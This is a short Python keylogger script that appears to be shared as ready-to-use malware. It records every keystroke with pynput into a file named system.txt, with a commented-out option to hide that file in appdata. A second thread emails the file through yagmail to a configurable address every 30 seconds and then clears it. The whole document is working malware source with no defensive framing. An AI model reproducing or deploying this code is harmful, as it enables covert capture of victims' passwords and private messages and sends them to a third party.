from concurrent.futures import thread
import os
from time import sleep
from pynput.keyboard import Listener
import yagmail

import threading


#coded by g0dmax55

keys = []
count = 0
#path = os.environ['appdata'] +'\\system.txt'
path = 'system.txt'

def keystrokes(key):
	global keys, count

	keys.append(key)
	count += 1

	if count >= 1:
		count = 0
		write_file(keys)
		keys = []

def write_file(keys):
	with open(path, 'a') as f:
		for key in keys:
			f.write(str(key))



def mail():
	receiver = "" # receiver email address
	body = "keylogger Text File"  # email body
	filename = ("system.txt")
	mailID = "" # mail id 
	password = "" # password 
	yag = yagmail.SMTP(mailID, password)

	while True:
		sleep(30.5)
		yag.send(to=receiver,subject="keylogger",contents=body, attachments=filename,)
		
		print("sending")
		sleep(1.5)
		fi = open(path, 'r+')
		fi.truncate(0)
	
	


def lis():
	with Listener(on_press=keystrokes) as listener:
		listener.join()

thread1 = threading.Thread(target=lis)
thread1.start()
thread2 = threading.Thread(target=mail)
thread2.start()
